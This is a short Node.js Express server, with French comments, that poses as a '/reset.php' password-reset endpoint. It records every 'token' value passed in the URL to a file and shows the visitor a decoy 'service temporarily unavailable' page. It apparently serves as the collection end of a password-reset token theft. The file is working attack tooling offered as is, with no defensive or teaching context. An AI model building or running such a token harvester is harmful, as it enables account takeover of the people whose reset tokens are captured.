const express = require('express');
const bodyParser = require('body-parser');
const cors = require('cors');
const fs = require('fs');

const app = express();

// Middleware
app.use(cors()); // Autoriser les requêtes cross-origin
app.use(bodyParser.json()); // Parser les requêtes JSON
app.use(bodyParser.urlencoded({ extended: true })); // Parser les données de formulaire

// Route pour récupérer le token depuis l'URL (GET)
app.get('/reset.php', (req, res) => {
    const token = req.query.token; // Récupérer le token depuis l'URL

    if (token) {
        // Enregistrer le token dans un fichier (ou une base de données)
        fs.appendFile('tokens.txt', `Token reçu : ${token}\n`, (err) => {
            if (err) {
                console.error('Erreur lors de l\'enregistrement du token :', err);
            } else {
                console.log(`Token enregistré : ${token}`);
            }
        });
    }

    // Toujours répondre avec le message générique
    res.status(200).send(`
        <html>
            <head>
                <style>
                    body {
                        display: flex;
                        justify-content: center;
                        align-items: center;
                        height: 100vh;
                        margin: 0;
                        font-family: Arial, sans-serif;
                        background-color: #f0f0f0;
                    }
                    .message {
                        text-align: center;
                        font-size: 24px;
                        color: #333;
                    }
                </style>
            </head>
            <body>
                <div class="message">This service is temporarily unavailable.</div>
            </body>
        </html>
    `);
});


// Démarrer le serveur
const PORT = 3000;
app.listen(PORT, () => {
    console.log(`Serveur démarré sur http://localhost:${PORT}`);
});